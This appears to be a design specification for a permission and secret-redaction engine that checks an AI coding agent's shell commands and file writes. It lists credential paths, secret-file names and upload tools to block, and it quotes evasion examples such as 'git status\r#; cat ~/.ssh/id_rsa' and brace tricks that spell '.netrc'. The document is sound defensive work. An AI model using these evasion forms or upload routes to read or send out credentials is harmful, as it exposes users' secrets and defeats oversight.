**`unresolvable-path`** is raised by a path operand built from a variable or substitution (a path-like word, a redirect target, an operand of a file reader such as `cat`, `head`, `base64`), a `${VAR:-…}` fallback the analyzer cannot know, a command whose expansions (braces and variables together) would build more than 1 MB of text or more than 8192 words, checked before anything is built, so the words past it go unchecked (every word up to it is checked as a path, since names like `.{a..z}{e..e}{a..z}{r..r}{c..c}` can still spell `.netrc`); an unquoted variable in a command where any word names IFS (`IFS=:`, `read IFS`, `mapfile -t IFS`, `for IFS in …`), which splits it where the analyzer does not follow; any relative operand after a `cd` it cannot follow (`cd $DIR`, `cd -`, `pushd +1`, `popd`, a `cd` under a `CDPATH` the command set); any other limit of the analysis that leaves part of the command unread (command substitutions nested more than 6 deep, shell strings nested more than 4 deep, a command longer than 64 KB), and text the lexer cannot parse; an argument from a variable to a git subcommand that has an option naming a file (`git log $X`, where `$X` may be `--output=<file>`), since it may be that option; also a file-tool path through a dangling link.

**`upload`** is raised by curl `-d/--data/--data-binary/--data-ascii/--json/-H` with `@file` or `@-`, `--data-urlencode`/`--url-query` with `name@file`, `-F/--form` with a file or a header file, and `-T/--upload-file`; any curl data form fed by stdin; curl or wget to a host other than `localhost`/`127.0.0.1`/`::1` fed by stdin; `wget --post-file/--body-file`; a curl data form or `wget --post-data/--body-data` whose value comes from a variable or substitution; `scp`/`rsync` to a `host:` target; `nc`, `ncat`, `socat`, `telnet`, `ftp`, `sftp`; `ssh` fed by stdin; `git push` to a URL or `host:path`, or to a remote the same command added or repointed (`git remote add`/`set-url`, `-c remote.x.url=`); `git send-email`; `npm`/`pnpm`/`yarn`/`bun publish`, `gem push`, `twine upload`, `cargo publish`, `docker`/`podman push`, and one of those programs with its subcommand from a variable; a curl `--data-urlencode`, `-F` or `-H` value from a variable; a `git push` after `git remote add`/`set-url` of a remote whose name comes from a variable; a secret file put on the clipboard.

Options are read in every spelling a program accepts (`-xc`, `-cX`, `--opt=X`, `--opt X`) for `env`, the shells, the interpreters, `bun` and `npx`/`pnpm exec`, up to the first operand. Before rules apply, wrappers come off (`env VAR=…`, `command`, `builtin`, `exec`, `nice`, `timeout`, `nohup`, `time`, `stdbuf`, `ionice`, `xargs`, `sudo`, `npx`, `pnpm exec/dlx`), and argv[0] is reduced to its base name, so `/bin/rm`, `command rm` and `env rm` are all `rm`. Inner command strings (`bash -c`, `eval`, `watch`, `su -c`, `sudo -s`, with each word escaped as sudo does) and substitutions are analyzed too, so a credential read inside them is still denied. `env -S` splits its value by env's own rules into words of the command, and the words after it stay separate. A `--` ends a wrapper's options before its command (`env -- cat …`). Words expand in bash's order before paths are judged: brace expansion, then `~` (at the start of a word, and after `=` and `:` in an assignment), then `$HOME`, `$PWD` and variables set earlier in the command, then field splitting of an unquoted value on blanks (`x="a $HOME/.ssh/id_rsa"; cat $x` is denied) and globbing of its glob characters; assignments are not split or globbed, `$'…'` quoting is decoded, and `cd` moves the base for later relative paths. A `${VAR:-default}` fallback counts only when the command set `VAR` to empty or unset it: a variable from outside may hold anything, and `${VAR=…}` and `${VAR:=…}` also set `VAR` to the fallback they take. An assignment before a command holds for that command only; before a POSIX special builtin (`:`, `eval`, `export`, …), where POSIX sh keeps it and bash does not, the name is unknown after it. Assignments alone take effect in order and before their redirections. `read` with no name sets `REPLY`, and `for NAME in …` sets `NAME`. A subshell (`( … )`), each element of a pipeline (bash runs every one in a subshell unless `lastpipe` is on, and a command that mentions `lastpipe` leaves what the last element changes unknown), a background job and a substitution run on a copy of the variables and the dir, so what they assign and where they `cd` does not hold after them; a `{ …; }` group runs in the shell itself. `eval` runs its string in the shell itself, and so does a trap's action, which is read where the trap is set and again when its shell ends: one that may run before any later command (any condition but `EXIT`) leaves each name it assigns unknown for the rest of the command, and the dir unknown when it moves it. Each shell keeps its own variables, dir and traps: a subshell or a child shell (`sh -c`, a script on stdin) starts from a copy, with its traps reset as bash resets them, and a trap is kept by its condition, so a reset (`trap - EXIT`), an ignore (`trap '' EXIT`) or a new action replaces it. A bare `cd` and a `~` read the shell's HOME: an unknown HOME is an unknown dir, an unset or empty one leaves `cd` where it is, and once the command sets HOME, bash 3.2's `~` follows it while bash 5.3's keeps the HOME it started with, so both count. A dir option moves by its rule: env's `-C` is the last one, from the dir env started in (its `-S` words too), and git's and tar's `-C` each start from the one before. A heredoc's substitutions run when the command that owns it applies its redirections, and a compound command applies its redirections when it starts.

Targets come from path-like arguments (with `/`, starting with `.` or `~`), redirections, and the file operands of known commands (`rm`, `cp`, `mv`, `tee`, `sed -i`, …). Every option value in the registry has a kind, so a value that names a file is a read or a write (`git archive --add-file`, `git blame --contents`, `sort -o`, git `--output` in any abbreviation), and an option the registry does not list is a read when its glued value looks like a path (`--exclude-from=~/x`). curl's values name files in the forms curl reads: `@file` for `-d`, `--json`, `-H` and `-w`, none for `--data-raw`, `name@file` for `--data-urlencode`, `--url-query` and `--variable`, and for `-F` each file and `headers=@file` as its form parser reads them. The second operand of `uniq` is a write, and when an argument from a variable may be an option, every operand from there on may be. A tar member is read, and an extraction writes, in the dir GNU tar's `-C` chain reaches at it and in the dir bsdtar's reaches at the first member, where bsdtar stops reading options. A bare word is also checked, and it becomes a target when it leads out of the workspace (a symlink) or names a secret file. A command's stdin is what the last redirection of fd 0 gives (`cat <<< a <<< b` reads `b`), else what pipes into it, else the stdin of the compound command around it (`echo x | (xargs cat)`, `{ xargs cat; } <<< x`) or of the command that runs its shell string (`bash -c 'xargs cat' <<< x`). The text that `echo`, `printf`, a heredoc or a here-string put there is split as xargs splits it (blanks and newlines, quotes, backslashes), and the items become operands of the command xargs runs: after its words, at BSD's `-J` word, or with `-I` one run per line, with the line in place of the string. `/dev/null` and the other standard devices are ignored, and running `/usr/bin/x` is treated like running `x`.

A target with an unexpanded glob (`*`, `?`, `[…]`, `**`) is matched component by component against the hard-deny roots, and for writes the protected and ask-write roots; if it can expand into one, it takes that zone (`cat ~/.ss?/config` is denied). Contents are followed through pipes, `<` and `>` redirections, copies and the clipboard, so `cat .env | base64` and `cat .env > notes.txt` are judged by where the secret file's text ends up.

## Lists

**Hard deny** (read, write and run; every mode), under the home dir: `.ssh`, `.aws`, `.gnupg`, `.config/gh`, `.config/gcloud`, `.azure`, `.kube`, `.docker/config.json`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `.pgpass`, `Library/Keychains`, and the browser profiles under `Library/Application Support/` (`Google/Chrome`, `Firefox`, `BraveSoftware`, `Arc`). `defaultHardDeny(homeDir)` returns them; the host adds its own with `roots.hardDeny`.

**Protected write** (deny): `<ws>/.pi`, the trusted roots, and `roots.protectedWrite`.

**Ask write** (ask outside Full): `<ws>/.git/hooks`, `<ws>/.git/config`, `<ws>/.husky`, `<ws>/.envrc`, `<ws>/.vscode/tasks.json`, the package-manager config that runs code on a later install or script run (`<ws>/.npmrc` with `script-shell` or `node-options`, `<ws>/.yarnrc` with `yarn-path`, `<ws>/.yarnrc.yml` with `yarnPath` or plugins, the `<ws>/.yarn/releases` and `<ws>/.yarn/plugins` code they load, `<ws>/.pnpmfile.cjs`, `<ws>/bunfig.toml` with `preload`), and `roots.askWrite`. `package.json` scripts run code too, but agents edit it for every dependency, so it stays a plain workspace file.

**Temp** (read and write): `os.tmpdir()`, `/tmp`, `/private/tmp`, and `/private/var/folders` on macOS (`defaultTempDirs()`), unless `roots.temp` is given.

**Secret files**: `.env .envrc .netrc .npmrc .pypirc .pgpass .boto .s3cfg .dockercfg .git-credentials .htpasswd credentials credentials.json client_secret.json service-account.json id_rsa id_dsa id_ecdsa id_ed25519`; `.env.*` except `.env.example .env.sample .env.template .env.dist`; and the extensions `pem key p12 pfx jks keystore bks ppk kdbx gpg pgp asc tfvars tfvars.json tfstate tfstate.backup`. Names match case-insensitively.

## Secrets

**Sources.** The secret files in the workspace (at the root and nested to depth 4, skipping `node_modules`, `.git` and build output (`.next`, `.turbo`, `dist`, `build`, `coverage`), files up to 256 KB): `.env*` and `.envrc` as dotenv, the ini-style ones (`.npmrc`, `.pypirc`, `.boto`, `.s3cfg`, `credentials`, `*.tfvars`), JSON ones, `.netrc`, `.pgpass`, `.htpasswd` and `.git-credentials`. Plus values the host adds (`addSecret`, `refreshSecrets({ values, env })`), token shapes found in any text (GitHub, GitLab, OpenAI, Anthropic, AWS, Google, Slack, npm, Stripe, Hugging Face, SendGrid, JWT, `Bearer …`, PEM private keys), and URL passwords (`scheme://user:pw@`).

**Which values are secret.** A value that the file's format makes a secret (the passwords in `.netrc`, `.pgpass` and `.git-credentials`, the hashes in `.htpasswd`), unless it is a local-dev default. Otherwise a value of 8 or more chars whose key matches `/(KEY|SECRET|TOKEN|PASSWORD|PASS|AUTH|CREDENTIAL|PRIVATE|DSN|DATABASE_URL)(_|$)/i`, or any value with a token shape. IDs such as `DATABASE_ID` and `OWNER_ID` are not secret. A URL with no password, a local-dev default (`password`, `postgres`, …), a boolean or a number is not secret by its key alone.

**Placeholder.** `«secret:NAME#h4»`, where `NAME` is the key (non-word chars become `_`) and `h4` is the first 4 hex chars of HMAC-SHA256(key, value), longer only on a collision. A token shape with no name of its own uses `NAME=TOKEN`. The longest value is replaced first, and a shorter value inside it is not replaced again.

**Restore.** In write and edit input to a secret file (`content`, `edits[].oldText`/`newText`, and legacy `oldText`/`newText`), so an edit's `oldText` matches the file. The secret file is the one the write really lands in: a plainly named link to `.env` gets the values back, and a link named `.env` that points at a plain file does not. In bash only after the user approved the command. Anywhere else a placeholder stays literal text. A write or edit that puts a real secret value or a placeholder into a file that is not a secret file raises `secret-into-plain-file`.

## Failure behavior

The engine fails toward asking or blocking:

- An unterminated quote or other text the lexer cannot parse, at the top or inside a substitution, leaves the analysis incomplete: it raises `unresolvable-path` and asks in every mode, Full included.
- The lexer reads a command the way bash runs it, so no second command hides from the checks: only space and tab separate words (`\r` is a word character, so `git status\r#; cat ~/.ssh/id_rsa` runs the `cat` and is denied); a heredoc delimiter is its word after quote removal with no expansion (`<<$X` ends at a line `$X`, `<<~` at `~`); an unquoted heredoc body joins a line that ends in an odd run of backslashes to the next one before it looks for the delimiter; and a quoted delimiter keeps the body literal. A word with a variable or substitution in it is unknown past its literal start, and no rule reads it as text: an option check sees only that start, and a subcommand or action from a variable counts as the risky one. A `~` right after an unquoted `:` in a word shaped like an assignment is the home dir too (`PATH=a:~/bin`). Braces expand before tildes, so a `~` that starts a brace alternative is the home dir (`cat {README.md,~/.ssh/id_rsa}` is denied), while `x{~,y}` and `~""/x` stay literal.
- A path that cannot be resolved asks in every mode, Full included, and cannot be granted.
- A tool call without a usable path is `unresolvable`.
- `redactResult` throws on any internal error; the caller must withhold the output.
- `evaluate` throws on an internal error; the caller must block the call (`permissions: internal error`).
- An unreadable or unparsable secret file is reported through `options.onError`, and the vault goes on with the other sources and the token shapes.

## Choices where the design was silent

- **Path display.** `/private/etc`, `/private/tmp` and `/private/var` show as `/etc`, `/tmp` and `/var` on macOS; the target `path` stays canonical.
- **Extra never-grant signals.** `placeholder-in-command` and `secret-into-plain-file` cannot be granted, so no "always" answer can cover a later secret.
- **`git push --force`** is destructive wherever it runs (it changes the remote); `git reset --hard` and `git clean -f` only outside the workspace.
- **Run in temp dirs** (`/tmp/x.sh`) is treated like read and write there: allowed in Workspace mode. Running from a read-only trusted root asks.
- **More secret-file formats** than `.env` feed the vault (ini, JSON, netrc, pgpass), and secret-named values from the host's `env` are redacted, so `env | grep TOKEN` shows placeholders.
- **More upload forms**: `ssh` fed by stdin, `telnet`, `ftp`, `sftp`, `curl -H @file`, and `curl -K` (options from a file) as `shell-dynamic`.
- **System binaries** (`/bin`, `/usr/bin`, `/usr/local/bin`, `/opt/homebrew/bin`, …) as argv[0] are not exec targets: they are the same as the bare name.
